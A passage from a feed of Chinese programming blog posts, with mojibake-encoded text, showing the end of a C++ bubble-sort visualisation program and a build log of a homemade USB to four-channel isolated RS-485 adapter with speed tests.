                         </span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">cyan</span><span style="color: rgba(128, 0, 0, 1)">"</span>,<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">blue</span><span style="color: rgba(128, 0, 0, 1)">"</span>,<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">purple</span><span style="color: rgba(128, 0, 0, 1)">"</span>,<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">pink</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">};
</span><span style="color: rgba(0, 0, 255, 1)">void</span> swap(<span style="color: rgba(0, 0, 255, 1)">int</span> i,<span style="color: rgba(0, 0, 255, 1)">int</span> j){   <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">äº¤æ¢ä¸¤ä¸ªèç¹</span>
     Node *a =<span style="color: rgba(0, 0, 0, 1)"> datas[i];
     Node </span>*b =<span style="color: rgba(0, 0, 0, 1)"> datas[j];   
     </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">äº¤æ¢aåbçxä»æ ï¼å¹¶ä¸å°è¾¾èªå·±çåæ     </span>
     <span style="color: rgba(0, 0, 255, 1)">int</span> tempx = a-&gt;<span style="color: rgba(0, 0, 0, 1)">x;
     a</span>-&gt;x = b-&gt;<span style="color: rgba(0, 0, 0, 1)">x;
     b</span>-&gt;x =<span style="color: rgba(0, 0, 0, 1)"> tempx;
     a</span>-&gt;sp-&gt;go(a-&gt;x,<span style="color: rgba(128, 0, 128, 1)">0</span><span style="color: rgba(0, 0, 0, 1)">);
     b</span>-&gt;sp-&gt;go(b-&gt;x,<span style="color: rgba(128, 0, 128, 1)">0</span><span style="color: rgba(0, 0, 0, 1)">);
     </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">å¨datasä¸­çä½ç½®ä¹è¦äº¤æ¢</span>
     Node *<span style="color: rgba(0, 0, 0, 1)">temp ;   
     temp </span>=<span style="color: rgba(0, 0, 0, 1)"> datas[i];
     datas[i] </span>=<span style="color: rgba(0, 0, 0, 1)"> datas[j];
     datas[j] </span>=<span style="color: rgba(0, 0, 0, 1)"> temp;     
}
</span><span style="color: rgba(0, 0, 255, 1)">int</span> main(){        <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">ä¸»åè½å </span>
   g_screen-&gt;bgcolor(<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">black</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">);
   </span><span style="color: rgba(0, 0, 255, 1)">int</span> n= randint(<span style="color: rgba(128, 0, 128, 1)">5</span>,<span style="color: rgba(128, 0, 128, 1)">8</span><span style="color: rgba(0, 0, 0, 1)">);
   </span><span style="color: rgba(0, 0, 255, 1)">int</span> x = <span style="color: rgba(128, 0, 128, 1)">50</span>-<span style="color: rgba(128, 0, 128, 1)">100</span>*n/<span style="color: rgba(128, 0, 128, 1)">2</span>;    <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">æå·¦è¾¹èç¹åæ (èµ·å§)</span>
   <span style="color: rgba(0, 0, 255, 1)">for</span>(<span style="color: rgba(0, 0, 255, 1)">int</span> i=<span style="color: rgba(128, 0, 128, 1)">0</span>;i&lt;n;i++){    <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">å»ºç«nä¸ªèç¹ï¼æ¾å°datasä¸­</span>
      <span style="color: rgba(0, 0, 255, 1)">int</span> v = randint(<span style="color: rgba(128, 0, 128, 1)">30</span>,<span style="color: rgba(128, 0, 128, 1)">200</span><span style="color: rgba(0, 0, 0, 1)">);
      Node </span>*node = <span style="color: rgba(0, 0, 255, 1)">new</span><span style="color: rgba(0, 0, 0, 1)"> Node;
      node</span>-&gt;value =<span style="color: rgba(0, 0, 0, 1)"> v;
      node</span>-&gt;x =<span style="color: rgba(0, 0, 0, 1)"> x;
      </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">æé¡ºåºéæ©ç´¢å¼ä¸ºiçé¢è²ï¼ç»åæè§è²çé åå¾ç</span>
      <span style="color: rgba(0, 0, 255, 1)">string</span> s = <span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">res/circle_</span><span style="color: rgba(128, 0, 0, 1)">"</span> + colors[i] + <span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">.png</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">;
      Sprite </span>*js = <span style="color: rgba(0, 0, 255, 1)">new</span> Sprite(s); <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">æ°å»ºè§è²ï¼ä»¥sä¸ºé å</span>
      js-&gt;scale(v/<span style="color: rgba(128, 0, 128, 1)">100.0</span>);        <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">æè§è²ç¼©å°ï¼è¦ä¸ç¶å¤ªå¤§äº</span>
      js-&gt;penup();  js-&gt;go(x,<span style="color: rgba(128, 0, 128, 1)">0</span>); js-&gt;speed(<span style="color: rgba(128, 0, 128, 1)">1</span>); <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">å®å¥½èµ·å§ä½ç½®</span>
      node-&gt;sp = js;             <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">èç¹åå«æè§è²æé</span>
<span style="color: rgba(0, 0, 0, 1)">      datas.push_back(node);      
      x </span>= x + <span style="color: rgba(128, 0, 128, 1)">100</span>;     <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">æ¯ä¸ªèç¹ç¸å·®100ä¸ªåä½</span>
<span style="color: rgba(0, 0, 0, 1)">   }
   Sprite pen{</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">blank</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">}; 
   pen.up().color(</span><span style="color: rgba(128, 0, 128, 1)">0</span>).sety(<span style="color: rgba(128, 0, 128, 1)">300</span>).write(<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">åæ³¡æåºç®æ³å¯è§åæ¼ç¤ºç¨åº</span><span style="color: rgba(128, 0, 0, 1)">"</span>,<span style="color: rgba(128, 0, 128, 1)">50</span><span style="color: rgba(0, 0, 0, 1)">);
   pen.color(</span><span style="color: rgba(128, 0, 128, 1)">30</span>).sety(<span style="color: rgba(128, 0, 128, 1)">230</span>).write(<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">ä½èï¼æå´ç,éç¨C++ç²¾çµåº</span><span style="color: rgba(128, 0, 0, 1)">"</span>,<span style="color: rgba(128, 0, 128, 1)">30</span><span style="color: rgba(0, 0, 0, 1)">);
   pen.color(</span><span style="color: rgba(128, 0, 128, 1)">60</span>).sety(<span style="color: rgba(128, 0, 128, 1)">180</span>).write(<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">C++ç²¾çµåºä½èï¼æå´ç</span><span style="color: rgba(128, 0, 0, 1)">"</span>,<span style="color: rgba(128, 0, 128, 1)">20</span><span style="color: rgba(0, 0, 0, 1)">);
   rocket.wait(</span><span style="color: rgba(128, 0, 128, 1)">1</span>).color(<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">yellow</span><span style="color: rgba(128, 0, 0, 1)">"</span>).penup().sety(<span style="color: rgba(128, 0, 128, 1)">130</span><span style="color: rgba(0, 0, 0, 1)">).hide();
   </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">çæ­£çåæ³¡æåºæ ¸å¿ç¨åºå¼å§äº</span>
   <span style="color: rgba(0, 0, 255, 1)">for</span>(<span style="color: rgba(0, 0, 255, 1)">int</span> j=<span style="color: rgba(128, 0, 128, 1)">1</span>;j&lt;n;j++){  <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">æåºçæ ¸å¿ç¨åºå¨è¿é</span>
      <span style="color: rgba(0, 0, 255, 1)">string</span> s = <span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">ç¬¬ </span><span style="color: rgba(128, 0, 0, 1)">"</span> + to_string(j) + <span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)"> è½®</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">;    
      </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">å é¤ææ©åçæå­ï¼ç¶ååä¸æ°çæå­ï¼å¹¶ä¸ç­å¾1ç§  </span>
      rocket.cleartxts(<span style="color: rgba(128, 0, 128, 1)">1</span>).write(s,<span style="color: rgba(128, 0, 128, 1)">42</span>).wait(<span style="color: rgba(128, 0, 128, 1)">1</span><span style="color: rgba(0, 0, 0, 1)">);
      </span><span style="color: rgba(0, 0, 255, 1)">for</span>(<span style="color: rgba(0, 0, 255, 1)">int</span> i=<span style="color: rgba(128, 0, 128, 1)">0</span>;i&lt;n-j;i++<span style="color: rgba(0, 0, 0, 1)">)   
         </span><span style="color: rgba(0, 0, 255, 1)">if</span>(datas[i]-&gt;value &gt; datas[i+<span style="color: rgba(128, 0, 128, 1)">1</span>]-&gt;value ) <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">åç°æ´å¤§çï¼åäº¤æ¢</span>
             swap(i,i+<span style="color: rgba(128, 0, 128, 1)">1</span><span style="color: rgba(0, 0, 0, 1)">);
      rocket.wait(</span><span style="color: rgba(128, 0, 128, 1)">1</span><span style="color: rgba(0, 0, 0, 1)">);
   }
   rocket.cleartxts(</span><span style="color: rgba(128, 0, 128, 1)">1</span>).write(<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">æ¼ç¤ºå®æ¯ï¼</span><span style="color: rgba(128, 0, 0, 1)">"</span>,<span style="color: rgba(128, 0, 128, 1)">42</span>).done();     <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">å®æäº</span>
   <span style="color: rgba(0, 0, 255, 1)">return</span> <span style="color: rgba(128, 0, 128, 1)">0</span>;    <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">è¿å0</span>
}</pre>
</div>
<p>&nbsp;</p>

</div>
<div class="clear"></div>

	<div class="postDesc">posted on 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-02-02 20:14">2026-02-02 20:13</span>&nbsp;
<a href="https://www.cnblogs.com/lixingqiu">æå´ç</a>&nbsp;
éè¯»(<span id="post_view_count">0</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19566285);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19566285', targetLink: 'https://www.cnblogs.com/lixingqiu/p/19566285', title: 'ä¸ä¸ªææçç¼ç¨æå®¤ï¼çµèå±å¹ååçä¸ä½ç¨åºåï¼ä½ ï¼ï¼æè¾¹ç«çä¸ä½å¥½å¥çæåã' })">ä¸¾æ¥</a>
</div>
 ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ ææå°±è¡ï¼æèªå¶äºä¸ä¸ªé«éUSBè½¬4è·¯éç¦»RS-485çæ¨¡åã ]]></title>
    <link>https://www.cnblogs.com/xiaomage-UAV/p/19566208</link>
    <guid>b449992f9324cea3ad844d5ae3f44a6d</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/xiaomage-UAV/p/19566208" title="åå¸äº 2026-02-02 19:35">
    <span role="heading" aria-level="2">ææå°±è¡ï¼æèªå¶äºä¸ä¸ªé«éUSBè½¬4è·¯éç¦»RS-485çæ¨¡åã</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<p>æè¿åä¸ä¸ªé¡¹ç®è¦ç¨å°USBè½¬å¤è·¯RS-485æ¥å£è¿è¡è°è¯ï¼å¨ç½ä¸æ¾äºä¸åï¼åç°å¸é¢ä¸ç°æçäº§åï¼ç¼ºç¹è¿æ¯å¤ªææ¾äºï¼1ãUSBå£å¤§å¤é½æ¯Type-Bè¿æ¥å¨ï¼2ãå¤§å¤éç¨å¡æå¤å£³ï¼ççä¸å¤é«çº§ï¼3ãæçä¸å¸¦éç¦»åè½ï¼è¿æ ·å¾å®¹ææçµèUSBå£ç»å¹²åºäºï¼4ãRS-485éä¿¡çæ³¢ç¹çå¤ªä½ï¼5ãä¸é¢å ä¸ªåé½é¿å¼çäº§åï¼ååªè½¬åºäºä¸è·¯485ãç¬¦åæéæ±çäº§åç«ç¶æ²¡æ¾å°ï¼äºæ¯ææç®èªå·±åä¸ä¸ªäº§åçº§çé«éUSBè½¬å¤è·¯RS-485æ¥å£çè®¾å¤ã<br>
å¶å®USBè½¬RS-485çæ¬è´¨æ¯USBè½¬ä¸²å£ï¼ç¶åä¸²å£æä¸ªRS-485æ¶åå¨å°±å¯ä»¥å®ç°ãæä»¥ç°å¨éè¦æ¾ä¸ä¸ªåéçUSBè½¬å¤è·¯ä¸²å£çè¯çï¼ä¸å¼å§æ³å°çæ¯FT4232ï¼è¿ä¸ªå¯ä»¥å®ç°USBè½¬4éé12Mbpsçä¸²å£ã<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3640975/202602/3640975-20260202193126789-681649945.png" class="lazyload"><br>
å¯æ¯å½çè¿ä¸ªè¯çå¨ç«åååçä»·æ ¼ä¹åï¼æç´å¼åè¾ãææ¯æ³åä¸ä¸ªäº§åï¼ä½æ¯æä¸æ³åä¸ä¸ªæèªå·±é½ç¨ä¸èµ·çäº§ååã<br>
å½ç¶ï¼è¿æå¦å¤çé®é¢ï¼å°±æ¯è¿ä¸ªFT4232çIOå£çµå¹³åªæ¯æ3.3Vãè¿ä¸ªå¦æç¨æ¥è°è¯å¶ä»çµå¹³çå¤è®¾ä¼å¾éº»ç¦ï¼è¿éè¦å çµå¹³è½¬æ¢çµè·¯ã<br>
ä¹åç¨èçUSBåå®¶æ²æçCH343Pèªå¶äºä¸ä¸ªUSBè½¬ä¸²å£TTLæ¨¡åï¼æé«æ³¢ç¹çè½å°6Mbps(éé¾æ¥)ç²ä¸ååæä½³ï¼äºæ¯ç®åèªç¶è½¬åäºæ²æçé«éUSBè½¬4ä¸²å£è¯çCH9114ï¼è¿ä¸ªç³»åçè¯çæ¯æ480Mbpsçé«éUSBéä¿¡ï¼å¯ä»¥æ©å±åº4è·¯15Mbpsçä¸²å£ï¼æ¯æ1.2Vã1.8Vã2.5Vã3.3VçIOå£çµå¹³ï¼å®å¨çµèä¸çé©±å¨æ¯æVCPåCDCä¸¤ç§ã<br>
è¿éç®åç§æ®ä¸ä¸VCPåCDCäºèçåºå«ï¼CDCé©±å¨æ¯é¨åæä½ç³»ç»çåç½®USBä¸²å£é©±å¨ï¼Windows10åä»¥ä¸çæ¬çç³»ç»åç½®ï¼æ´æ©ççæ¬éè¦æå¨å®è£ï¼LinuxåAndroidè§å·ä½çç³»ç»èå®ãèVCPé©±å¨æ¯ååæä¾çä¸ç¨USBèæä¸²å£é©±å¨ç¨åºï¼å·¥ä½æ¶å¨Windowsç³»ç»çâç«¯å£ï¼COMåLPTï¼âä¸æ ä¼çæCOMå£ï¼Linux/Android/macOSç³»ç»å¨/devç®å½ä¸ä¼çæTTYè®¾å¤èç¹ã<br>
VCPé©±å¨çç¹ç¹æ¯æ¯æé«éçéä¿¡åç¡¬ä»¶æµæ§ãæ¯æGPIOæ©å±ãä»¿çæ åä¸²å£ãè®¡ç®æºç«¯ä¸²å£åºç¨ç¨åºå®å¨å¼å®¹ãé©±å¨åªéè¦å®è£ä¸æ¬¡ä¸å¯èç½èªå¨å®è£ãå¯éååºç¨å±å¨æåºä½¿ç¨ï¼æä¾USBç­ææãä¸²å£å·æ£æµãGPIOç­æ©å±åè½ãæä»¥å»ºè®®ä¼åéæ©ä½¿ç¨VCPé©±å¨ã<br>
å¦å¤å¯è½æäººè¦é®äºï¼485æ¨¡åç¨å¾çè¿ä¹é«çæ³¢ç¹çåï¼ç­æ¡æ¯ï¼æè¿ä¸ªéè¦çï¼æ¯å¦å¤æ©å·ç¼ç å¨éç¨çå°±æ¯æ³¢ç¹çåºå®ä¸º2.5MHzæè5MHzçåºäºRS-485çä¸ç¨ä¸²å£éè®¯åè®®ãï¼æ¬ææ«å°¾éæ³¢ç¹çæµè¯ç¯èï¼<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3640975/202602/3640975-20260202193143445-284871605.png" class="lazyload"><br>
æ¯è¾ç½çæ¯ï¼CH9114æå¥½å ç§å°è£å½¢å¼ï¼å¶ä¸­CH9114Lå¼å®¹FT4232HLï¼CH9114Wå°è£å¼å®¹FT4232H-56Qï¼é¤äºè¿ä¸¤ç§å°è£ï¼è¿æä¸ä¸ªCH9114Fæ¯QFN32å°è£ï¼å°ºå¯¸éå¸¸å°ï¼å¾éåæç¨æ¥åè¿ä¸ªé«éUSBè½¬å¤è·¯RS-485æ¥å£è®¾å¤ã<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3640975/202602/3640975-20260202193155394-1444049234.png" class="lazyload"><br>
æææå³é®çæ¯ï¼å¨ç«åååçäºä¸ä¸è¿ä¸ªè¯ççä»·æ ¼æ¯åé¢éçFT4232åçå¤äºï¼åå åé±ï¼æ¯æè½ç¨å¾èµ·çã<br>
è¯çéå®äºï¼å°±å¯ä»¥ç»åçå¾äºã<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3640975/202602/3640975-20260202193208285-1228879395.png" class="lazyload"><br>
è¿ä¸ªè¯ççåçå¾æ¯è¾ç®åï¼æ»å±å ä¸åä¸ªçµå®¹å°±å¯ä»¥äºãå¦å¤ï¼å¤æ485æ¶åå¨æ¶ï¼å¯ä»¥æRIè¿ä¸ªä¿¡å·ç´æ¥ç¨æ¥åæ¶åå¨çæ¶ååæ¢ï¼æç§ä¸å¾ä¸­ç»¿æ¡ä¸­æç¤ºï¼ç»è¿ä¸ªå¼èå ä¸ªä¸æçµé»å°±è¡ã<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3640975/202602/3640975-20260202193216192-457922656.png" class="lazyload"><br>
CH9114çæåä¸­æå°ï¼å¦æè¯çå·¥ä½ç¯å¢ç¸å¯¹æ¯è¾çæ³ï¼ä¸ä¸²å£æ³¢ç¹çè¯¯å·®è½æ»¡è¶³ä½¿ç¨éæ±ï¼å°±å¯ä»¥ä¸çæ¥å¤é¨æ¶æ¯ï¼åªéè¦å°XIå¼èè¿æ¥GNDå°±å¯ä»¥åæ¢åé¨æ¶éãä½æ¯æè¦åé«æ§è½çæ¶åå¨ï¼æä»¥ä¸å¿çé±ãäºæ¯å¨PCBä¸æ¾äºæ¬å´çXL7KI-111-24Mæ¶æ¯ï¼å®éç¨2016è¶å°å°è£ï¼æ¾å¨æ¿å­ä¸ä¸å é¢ç§¯ï¼èä¸25âå·¥åµç²¾åº¦ä¸ºÂ±10ppmï¼è¿æ ·æ´ä¸ªæ¶åå¨çæ³¢ç¹çç²¾åº¦å°±ä¼å¾é«ã<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3640975/202602/3640975-20260202193222756-66537236.png" class="lazyload"><br>
è¿ä¸ªè®¾å¤ç¨USB2.0éä¿¡ï¼ä½¿ç¨Type-Cæ¥å£ä¸éè¦èèæ°æ®çº¿æ­£åæè¯å«çé®é¢ï¼æä»¥ç¨Type-Cå£æ¯æç½çãä½æ¯è¦æ³¨æï¼ç»è¿æ¥å¨çä¸¤ä¸ªCCå¼èæ¥5.1Kçä¸æçµé»ãå¦å¤ï¼USBä¿¡å·çº¿ä¸å ä¸ä¸ªESDä¿æ¤è¯çï¼VBUSçµæºè¾å¥è¦å ä¸ªèªæ¢å¤ä¿é©ä¸ãè½ç¶æ²æä¹æç»USBè¯çéå¥çESDä¿æ¤è¯çCH412ï¼ä½é£ä¸ªè¯çæåè·¯ï¼æåªç¨ä¸¤è·¯ï¼æä»¥éäºä¸ªSTçã<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3640975/202602/3640975-20260202193229147-862908168.png" class="lazyload"><br>
è¿æ¯RS-485éç¦»æ¶åå¨ççµè·¯ãè¿ééç¨çéç¦»æ¶åå¨æ¯TIçISO3088DWRï¼è¿ä¸ªæ¶åå¨ç¬¦åTIA/EIA RS-485çè¦æ±ï¼éç20Mbpsï¼1/8åä½è´è½½è®©æ»çº¿ä¸å¯ä»¥æ256ä¸ªè¿æ ·çèç¹ãä¸ä¸ªè¯çå®ç°äºRS-485æ¶åå¨çåè½+20Mbpséçä¿¡å·çéç¦»ï¼ç¨èµ·æ¥è¿æ¯å¾ç½çã<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3640975/202602/3640975-20260202193236814-1386112149.png" class="lazyload"><br>
åçå¾æå®ä¹åï¼PCBè®¾è®¡å°±æ¯è¾ç®åäºï¼ææå¨ä»¶æ¾å¨é¡¶å±å°±å¯ä»¥äºãéç¦»çµæºå485éç¦»æ¶åå¨æ¾å¨åä¸åï¼è¿æ ·æ¹ä¾¿åéç¦»ãå¸å±å¸çº¿å®æä¹åè¿è¡ææ¿å°±è¡ã<br>
æ¿å­ä¸ºå¥è®¾è®¡æè¿æ ·å­å¢ï¼è¿å°±æç¹åèªå¤©åå¨æºçå°ºå¯¸è®¾è®¡æç»è¦è¿½æº¯å°å¤ä»£çä¸¤å¹é©¬çå±è¡è·ç¦»æ¯ä¸ä¸ªéçãé¦åï¼æ4ä¸ª3.81çå¤å°ç«¯å­æ¾å¨æ¿å­å³ä¾§ä¹åï¼è¿åä¸ªå¤å°ç«¯å­çè·ç¦»åºæ¬ç¡®å®äºï¼äºæ¯æ¿å­çå¤§æ¦å®½åº¦å°±æäºãæ ¹æ®å¨ä»¶çç®åå¸å±ï¼å¯ä»¥ç¡®å®åºæ¿å­çå¤§æ¦é¿åº¦ãåæ ¹æ®è¿ä¸ªå¤§æ¦çå®½åº¦åé¿åº¦ï¼éæ©ä¸æ¬¾åéçéåéåæï¼ä½ä¸ºä»çå¤å£³ã<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3640975/202602/3640975-20260202193243535-494769352.png" class="lazyload"><br>
è¿æ¯éæ©çå¤å£³çæ¨ªæªé¢ï¼å®ä¸ä¸å¯ä»¥åç¦»ï¼è¿æ ·æ¹ä¾¿å®è£çæ¥äºç´æLEDççµè·¯æ¿ãå®è£çµè·¯æ¿çæ§½ï¼å®½åº¦ç¡®å®æ¯56.6mmï¼è¿æ ·æ¿å­å¯ä»¥å56mmãååº¦2mmä¸å·®+0.1å·¦å³ï¼äºæ¯æéæ©å2mmåçPCBï¼å¨å®è£å¤ä¸å¸¦éç®åç»¿æ²¹çæåµä¸æ¯2mm-0.1mmå·¦å³ï¼å®è£èµ·æ¥ä¼æ¯è¾èæã<br>
è¿éä¸å¾ä¸åæ§½ä¸å¥ï¼2mmçæ¿å­ææ ·æ¹éé½æ¯1.6mmçæ¿å­è´µäºå¥½å¤åï¼ä½æ¯å¥½å¤æ¯ï¼ä¹ç»å®äºå¥½å¤ï¼ä¸æé¢ç¹ææç«¯å­å¯¼è´æ¿å­çæ¥ç¹ä¸è¯ãåæ­¥è®¾è®¡å¥½PCBåå¤å£³ä¹åï¼å°±ç­çå®ä»¬å°è´§äºã<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3640975/202602/3640975-20260202193250400-1393469400.png" class="lazyload"><br>
æ¿å°çPCBå¾æ¼äº®ï¼ä¸ç¥éæ¯è°è®¾è®¡åºè¿ä¹æ¼äº®çPCBæ¿ã<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3640975/202602/3640975-20260202193257105-2021126094.png" class="lazyload"><br>
ä¸å¥½é¡èï¼éº»å©çæå¥½äºç©æï¼ä¸¢è¿çå­çæ¥å¥½ä¹åï¼åæå¨çæ¥ä¸ä¸å¤å°ç«¯å­ãéç¦»çµæºï¼LEDæç¤ºç¯ï¼è¿ä¸ªæ¿å­å°±æäºã<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3640975/202602/3640975-20260202193303985-1217930184.png" class="lazyload"><br>
åå¤å¥½çµè·¯æ¿ï¼éåéåæå¤å£³ï¼èºä¸ï¼å°±å¯ä»¥å¼å§å®è£äºã<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3640975/202602/3640975-20260202193313883-852379591.png" class="lazyload"><br>
åæé¢æ¿è´´ä¸å»ï¼è¿æ ·ä¸ä¸ªæ»¡æ»¡å·¥ä¸é£çï¼éåº¦é«è¾¾15MbpsçUSBè½¬4è·¯éç¦»RS-485æ¨¡åå°±åå¥½äºã<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3640975/202602/3640975-20260202193322958-1998265525.png" class="lazyload"><br>
è¿ä¸ªæ¡æ¿ä¸Type-Cå£å¼å¾å¾å®ç¾ï¼ççèææææ»¡äºã<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3640975/202602/3640975-20260202193329711-472339848.png" class="lazyload"><br>
æç»åå£³ä¸å¼äºä¸¤ä¸ªèºä¸å­ï¼è¿æ ·å¯ä»¥å®è£ä¸ä¸ªæ åå¯¼è½¨å¡æ£ï¼å¯ä»¥æ¹ä¾¿å°å®è£å¨35mmå¯¼è½¨ä¸äºã<br>
æ§è½ä½éªï¼<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3640975/202602/3640975-20260202193335961-675699676.png" class="lazyload"><br>
æä¸çµèç´æ¥æ¾ç¤ºåºäºåè·¯ä¸²å£ï¼åå«ç¨ABCDåºåãè¿ä¸æé¢æ¿ä¸çCH-Aï¼CH-Bï¼CH-Cï¼CH-Dä¸ä¸å¯¹åºã<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3640975/202602/3640975-20260202193342120-1481062490.png" class="lazyload"><br>
ææ¨¡åçCH-AåCH-Cç¨ç«¯å­çº¿è¿æ¥èµ·æ¥ï¼ç¶åæå¼ä¸¤ä¸ªä¸²å£ä¸ä½æºï¼å¶ä¸­ä¸ä¸ªæå¼CH-Aå¯¹åºçä¸²å£ï¼å¦ä¸ä¸ªæå¼CH-Cå¯¹åºçä¸²å£ï¼ä¸¤ä¸ªä¸²å£çæ³¢ç¹çé½æå¨è¾å¥15000000ï¼è¡¨ç¤º15Mbpsãç¶åä½¿ç¨CH-Aå®æ¶50msåéä¸æ¬¡æ°æ®ï¼åéåå®¹ä¸ºâè¿æ¯ä¸æ¬¡é«é485éä¿¡æµè¯ï¼âï¼å±è®¡åé13988ä¸ªå­èï¼æ¥æ¶ç«¯ä¹æ¾ç¤ºæ¥æ¶å°13988ä¸ªå­èï¼æ ä¸¢å¸§ã<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3640975/202602/3640975-20260202193348389-2098071633.png" class="lazyload"><br>
åä¸ä¸ªä¼ è¾æä»¶çæµè¯ï¼å¶ä¸­å·¦è¾¹ççªå£æå¼CH-Aééï¼å³è¾¹çä¸²å£æå¼CH-Cééï¼æ³¢ç¹çé½è®¾ç½®ä¸º15Mbpsï¼å·¦è¾¹çªå£ä½ä¸ºåéç«¯ï¼åéä¸ä¸ª338MBçè§é¢æä»¶ï¼å³è¾¹çªå£æ¥æ¶æä»¶ï¼å¼å§åéåï¼éä¿¡éåº¦ç¨³å®å¨1427KB/sçéåº¦ï¼ä¼ è¾ç»æåæ¾ç¤ºç¨æ¶252sï¼ä¼ è¾å®æåï¼å¨å³è¾¹ççªå£ä¸­ï¼ä¿å­æ¥æ¶çæä»¶ä¸ºaaa.mp4ï¼ç¶åæå¼è¿ä¸ªè§é¢å¯æ­£å¸¸æ­æ¾ï¼è¯´ææ²¡æä»»ä½è¯¯ç ãéç çé®é¢ãä½¿ç¨RS485ä¼ è¾æ°æ®ï¼è½è¾¾å°è¿ä¸ªéåº¦å¾èµäºã<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3640975/202602/3640975-20260202193355954-1397065651.png" class="lazyload"><br>
